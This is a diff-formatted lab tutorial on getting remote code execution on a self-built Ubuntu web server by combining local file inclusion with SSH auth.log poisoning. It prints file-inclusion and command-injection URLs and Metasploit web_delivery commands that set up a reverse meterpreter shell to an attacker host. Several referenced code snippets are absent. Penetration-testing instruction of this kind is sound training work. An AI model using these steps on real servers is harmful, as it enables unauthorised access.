@@ -1,0 +1,52 @@
+
+RCE with LFI and SSH Log Poisoning
+
+In this article you will learn how make unauthorised access in a web server if it is suffering from local file inclusion vulnerability with help of auth log file. To perform this attack Please read our previous article “Beginner Guide to File Inclusion Attack (LFI/RFI)” and “Configure Web Server for Penetration Testing (Beginner Guide)” that will help you in configuration of own web server as well as more about LFI vulnerability.
+ Attacker: Kali Linux
+Target: Ubuntu
+ Let’s Begin!!
+Create a PHP file which will allow the user to include a file through file parameter. Hence using file parameter we can execute a file that contains malicious code to make unauthorised access is target PC. 
+I had saved given below PHP code inside a text file as lfi.php and saved on desktop.
+
+Now login with user as “root” and create a folder “lfi” inside /var/www/html
+Move lfi.php file from desktop to /var/www/html using given below command.
+
+Since we had added a php file with include function inside /var/www/html which allow to read the content of another file through it and can lead to LFI attack. Let’s demonstrate it by exploring following URL to read password files:
+From given image you can observe that above URL has dumped following result shown below.
+
+Open terminal in your kali Linux and connect the target through SSH service
+From screenshot you can see I am connected with target system.
+
+Type following command to view its logs:
+From given below image you can check the details of generated logs for auth.log file.
+
+Now I will try to open auth.log log file through lfi.php on browser therefore give read and write permission to
+
+Now to include the auth.log file as file parameter and give following URL inside browser.
+192.168.1.129/lfi/lfi.php?file=/var/log/auth.log
+From given image you can see it is showing created auth logs in browser also.
+
+Since the auth.log file generates log for every success and failed login attempt when we try to connect with web server. Taking advantage of this feature now I will send malicious PHP code as fake user and it will get added automatically in auth.log file as new log.
+
+Again when you will check its log, you will find the PHP code has been added as new log.
+Type following command to view its logs:
+
+Here it will dump the data of auth log as well as execute comment given through cmd; now execute ifconfig as cmd comment to verify network interface and confirm its result from inside the given screenshot.
+192.168.1.129/lfi/lfi.php?file=/var/log/auth.log &c=ifconfig
+
+If you found such kind of vulnerability in any web application then you can use metasploit platform to exploit web server.
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)> set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)> set lhost 192.168.1.123
+msf exploit (web_delivery)>set srvport  8081
+msf exploit (web_delivery)>exploit
+Copy the highlighted text shown in below window
+
+Paste the above copied malicious code inside URL as shown in given image and execute it as command.
+
+When above code gets execute you will get meterpreter session 1 of targeted web server.
+msf exploit (web_delivery)>sessions 1
+meterpreter> sysinfo
+
+ Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
